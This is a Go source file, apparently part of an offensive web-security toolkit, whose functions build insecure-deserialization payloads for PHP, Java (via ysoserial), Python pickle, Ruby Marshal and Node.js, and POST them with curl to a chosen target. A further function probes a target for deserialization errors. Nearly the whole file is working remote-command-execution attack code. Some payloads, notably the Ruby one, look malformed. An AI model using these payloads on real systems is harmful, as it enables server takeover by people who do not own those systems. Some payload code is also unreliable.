package websecurity

import (
	"fmt"
	"strings"
)

func DeserPHP(target, gadget, cmd string) (string, error) {
	payload := fmt.Sprintf(`O:1:"A":1:{s:4:"hook";s:%d:"%s";}`, len(cmd), cmd)
	cmdExec := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", fmt.Sprintf("data=%s", payload), target)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("PHP deserialization failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("PHP deserialization on %s with gadget %s: %s", target, gadget, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func DeserJava(target, ysoserialPayload, cmd string) (string, error) {
	cmdExec := throttledExec("java", "-jar", "ysoserial.jar", ysoserialPayload, cmd)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("ysoserial generation failed: %w: %s", err, string(out))
	}
	payload := string(out)
	curlCmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/x-java-serialized-object", "-d", payload, target)
	curlOut, curlErr := curlCmd.CombinedOutput()
	if curlErr != nil {
		return "", fmt.Errorf("Java deserialization delivery failed: %w: %s", curlErr, string(curlOut))
	}
	return fmt.Sprintf("Java deserialization on %s with %s payload: response_len=%d", target, ysoserialPayload, len(curlOut)), nil
}

func DeserPythonPickle(target, cmd string) (string, error) {
	payload := fmt.Sprintf("cos\nsystem\n(S'%s'\ntR.", cmd)
	cmdExec := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/python-pickle", "-d", payload, target)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Python pickle deserialization failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Python pickle deserialization on %s with command %s: %s", target, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func DeserRuby(target, cmd string) (string, error) {
	payload := fmt.Sprintf("BAhbCGMVR2V0c29tZQl7BjoMZXh0cmFzewY7ClQ6CWNtZCIl%sBq", cmd)
	cmdExec := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/x-ruby-marshal", "-d", payload, target)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Ruby Marshal deserialization failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Ruby Marshal deserialization on %s with command %s: %s", target, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func DeserNode(target, cmd string) (string, error) {
	payload := fmt.Sprintf(`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('%s',function(e,o){console.log(o)})}()"}`, cmd)
	cmdExec := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, target)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Node.js unserialize failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Node.js unserialize on %s with command %s: %s", target, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func DeserDetect(target, serializedObj string) (string, error) {
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/octet-stream", "-d", serializedObj, target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("deserialization detection failed: %w: %s", err, string(out))
	}
	detected := strings.Contains(string(out), "error") || strings.Contains(string(out), "exception") || strings.Contains(string(out), "stack")
	return fmt.Sprintf("Deserialization detection on %s: potential_vuln=%v response_len=%d", target, detected, len(out)), nil
}
